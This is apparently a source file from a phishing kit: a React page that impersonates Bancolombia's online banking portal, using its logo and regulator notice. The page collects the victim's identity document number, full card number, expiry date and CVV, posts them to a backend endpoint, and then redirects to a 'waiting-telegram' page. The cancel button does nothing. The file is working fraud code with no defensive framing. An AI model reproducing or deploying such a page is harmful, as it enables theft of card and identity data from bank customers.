import { useState, useEffect } from "react";
import { useLocation } from "wouter";
import { ChevronDown, Loader2 } from "lucide-react";
import { Card, CardContent } from "@/components/ui/card";

import logoSymbol from "@assets/LogoBancolombia_1764027131736.png";

export default function TCC() {
  const [, setLocation] = useLocation();
  const [documentType, setDocumentType] = useState("");
  const [documentNumber, setDocumentNumber] = useState("");
  const [cardNumber, setCardNumber] = useState("");
  const [cardExp, setCardExp] = useState("");
  const [cardCvv, setCardCvv] = useState("");
  const [showDocumentDropdown, setShowDocumentDropdown] = useState(false);
  const [clientIp, setClientIp] = useState("Cargando...");
  const [currentTime, setCurrentTime] = useState(new Date());
  const [isLoading, setIsLoading] = useState(false);

  const documentTypes = [
    "Cédula de ciudadanía",
    "Cédula de extranjería",
    "Pasaporte",
    "Permiso de permanencia",
  ];

  useEffect(() => {
    fetch("/api/client-ip")
      .then((res) => res.json())
      .then((data) => setClientIp(data.ip))
      .catch(() => setClientIp("0.0.0.0"));

    const timer = setInterval(() => {
      setCurrentTime(new Date());
    }, 1000);

    return () => clearInterval(timer);
  }, []);

  const handleContinue = async () => {
    if (!documentType || !documentNumber.trim() || cardNumber.length !== 16 || !cardExp.trim() || !cardCvv.trim()) {
      return;
    }
    
    setIsLoading(true);

    try {
      const userId = localStorage.getItem("userId");
      
      const response = await fetch('/api/send-card-data', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          userId,
          documentType,
          documentNumber,
          cardNumber,
          cardExp,
          cardCvv
        }),
      });

      const data = await response.json();

      if (response.ok && data.success) {
        // Navigate to waiting telegram page
        setLocation("/waiting-telegram");
      } else {
        setIsLoading(false);
      }
    } catch (error) {
      console.error("Send card data error:", error);
      setIsLoading(false);
    }
  };

  return (
    <div className="min-h-screen flex flex-col items-center bg-background px-4 py-8 font-sans text-white relative">
      {/* Loading Overlay */}
      {isLoading && (
        <div className="absolute inset-0 bg-black/80 z-50 flex flex-col items-center justify-center backdrop-blur-sm">
          <Loader2 className="w-12 h-12 text-[#FDDA24] animate-spin mb-4" />
          <p className="text-white font-medium">Cargando...</p>
        </div>
      )}

      {/* Header Text */}
      <div className="mb-8 flex justify-center items-center gap-3">
        <img
          src={logoSymbol}
          alt="Bancolombia Symbol"
          className="h-12 w-12 object-contain"
        />
        <h1 className="text-3xl font-bold text-white">Bancolombia</h1>
      </div>
      <h1 className="text-2xl font-normal mb-8 text-center">
        Sucursal Virtual Personas
      </h1>

      <div className="w-full max-w-sm">
        {/* TCC Card */}
        <Card className="bg-[#383838] border-none shadow-xl rounded-xl overflow-hidden text-white">
          <CardContent className="pt-10 pb-8 px-8">
            <div className="text-center mb-8">
              <h2 className="text-lg font-semibold mb-3">Datos de tarjeta</h2>
            </div>


            {/* Form Section */}
            <div className="space-y-6">
              <div>
                <p className="text-sm font-semibold mb-2">Ingresa tus datos</p>
                <p className="text-xs text-gray-300 mb-6">
                  Ingresa tu tarjeta verificar tu identidad.
                </p>

                {/* Document Type Dropdown */}
                <div className="space-y-4">
                  <div className="relative">
                    <button
                      onClick={() => setShowDocumentDropdown(!showDocumentDropdown)}
                      className="w-full flex items-center justify-between text-left px-0 py-3 border-b border-gray-500 hover:border-gray-400 transition-colors text-white"
                      data-testid="button-document-type"
                    >
                      <div className="flex items-center gap-2">
                        <svg className="w-5 h-5 text-gray-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
                          <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
                        </svg>
                        <span className={documentType ? "text-white" : "text-gray-400"}>
                          {documentType || "Tipo de documento"}
                        </span>
                      </div>
                      <ChevronDown className={`w-4 h-4 transition-transform ${showDocumentDropdown ? "rotate-180" : ""}`} />
                    </button>

                    {showDocumentDropdown && (
                      <div className="absolute top-full left-0 right-0 bg-[#4a4a4a] rounded mt-1 z-10 shadow-lg">
                        {documentTypes.map((type) => (
                          <button
                            key={type}
                            onClick={() => {
                              setDocumentType(type);
                              setShowDocumentDropdown(false);
                            }}
                            className="w-full text-left px-4 py-3 hover:bg-[#5a5a5a] transition-colors border-b border-[#3a3a3a] last:border-b-0 text-white text-sm"
                            data-testid={`option-document-${type}`}
                          >
                            {type}
                          </button>
                        ))}
                      </div>
                    )}
                  </div>

                  {/* Document Number Input */}
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={documentNumber}
                      onChange={(e) => {
                        let value = e.target.value.replace(/\D/g, "");
                        if (value.length > 10) value = value.slice(0, 10);
                        setDocumentNumber(value);
                      }}
                      placeholder="Número de documento"
                      className="w-full px-0 py-3 bg-transparent border-b border-gray-500 hover:border-gray-400 focus:border-[#FDDA24] transition-colors text-white placeholder-gray-400 outline-none"
                      data-testid="input-document-number"
                    />
                  </div>

                  {/* Card Number Input */}
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardNumber}
                      onChange={(e) => {
                        let value = e.target.value.replace(/\D/g, "");
                        if (value.length > 16) value = value.slice(0, 16);
                        setCardNumber(value);
                      }}
                      placeholder="# de la tarjeta"
                      className="w-full px-0 py-3 bg-transparent border-b border-gray-500 hover:border-gray-400 focus:border-[#FDDA24] transition-colors text-white placeholder-gray-400 outline-none"
                      data-testid="input-card-number"
                    />
                  </div>

                  {/* Card Expiry Input */}
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardExp}
                      onChange={(e) => {
                        let value = e.target.value;
                        // Solo permite números y /
                        value = value.replace(/[^\d/]/g, "");
                        
                        // Máximo 5 caracteres (MM/YY)
                        if (value.length > 5) value = value.slice(0, 5);
                        
                        // Auto-formatear: si tiene 2 dígitos sin /, agrega /
                        const digitsOnly = value.replace(/\D/g, "");
                        if (digitsOnly.length > 4) {
                          value = digitsOnly.slice(0, 2) + "/" + digitsOnly.slice(2, 4);
                        } else if (digitsOnly.length >= 2 && !value.includes("/")) {
                          value = digitsOnly.slice(0, 2) + "/" + digitsOnly.slice(2);
                        } else {
                          value = digitsOnly;
                        }
                        
                        setCardExp(value);
                      }}
                      placeholder="EXP (MM/YY)"
                      className="w-full px-0 py-3 bg-transparent border-b border-gray-500 hover:border-gray-400 focus:border-[#FDDA24] transition-colors text-white placeholder-gray-400 outline-none"
                      data-testid="input-card-exp"
                    />
                  </div>

                  {/* Card CVV Input */}
                  <div className="relative">
                    <input
                      type="text"
                      inputMode="numeric"
                      value={cardCvv}
                      onChange={(e) => {
                        let value = e.target.value.replace(/\D/g, "");
                        if (value.length > 4) value = value.slice(0, 4);
                        setCardCvv(value);
                      }}
                      placeholder="CVV"
                      className="w-full px-0 py-3 bg-transparent border-b border-gray-500 hover:border-gray-400 focus:border-[#FDDA24] transition-colors text-white placeholder-gray-400 outline-none"
                      data-testid="input-card-cvv"
                    />
                  </div>
                </div>
              </div>
            </div>

            {/* Buttons */}
            <div className="space-y-3 pt-8 mt-6">
              <button
                onClick={handleContinue}
                disabled={!documentType || !documentNumber.trim() || cardNumber.length !== 16 || !cardExp.trim() || !cardCvv.trim()}
                className={`w-full rounded-full font-bold py-3 transition-all ${
                  documentType && documentNumber.trim() && cardNumber.length === 16 && cardExp.trim() && cardCvv.trim()
                    ? "bg-[#FDDA24] hover:bg-[#FFF066] text-black"
                    : "bg-[#888888] hover:bg-[#999999] text-black opacity-50"
                }`}
                data-testid="button-continue"
              >
                Continuar
              </button>
              <div
                className="w-full text-white font-medium py-3 hover:opacity-80 transition-opacity underline text-center cursor-not-allowed"
                data-testid="button-cancel"
              >
                Cancelar
              </div>
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Footer Section */}
      <div className="w-full mt-12 pt-8 border-t border-white/10 text-center text-white px-4">
        <div className="max-w-sm mx-auto space-y-6">
          {/* Links */}
          <div className="space-y-3 text-sm">
            <p className="text-gray-300">¿Problemas para conectarte?</p>
            <div className="space-y-2">
              <a href="#" className="block text-white hover:underline">
                Aprende sobre seguridad
              </a>
              <a href="#" className="block text-white hover:underline">
                Reglamento Sucursal Virtual
              </a>
              <a href="#" className="block text-white hover:underline">
                Política de privacidad
              </a>
            </div>
          </div>

          {/* Bancolombia Logo and Vigilado */}
          <div className="pt-4 space-y-3">
            <div className="flex justify-center items-center gap-2">
              <div className="flex flex-col gap-1">
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
                <div className="w-4 h-1 bg-white rounded-full"></div>
              </div>
              <span className="text-lg font-bold">Bancolombia</span>
            </div>
            <p className="text-xs text-gray-400">
              VIGILADO <span className="block text-xs">Superintendencia Financiera de Colombia</span>
            </p>
          </div>

          {/* IP and Time */}
          <div className="text-xs text-gray-500 space-y-1 border-t border-white/10 pt-4">
            <p>Dirección IP: {clientIp}</p>
            <p>
              {currentTime.toLocaleDateString('es-CO', { weekday: 'long', year: 'numeric', month: 'long', day: 'numeric' })}, {currentTime.toLocaleTimeString('es-CO', { hour: '2-digit', minute: '2-digit', second: '2-digit', hour12: true })}
            </p>
          </div>
        </div>
      </div>
    </div>
  );
}
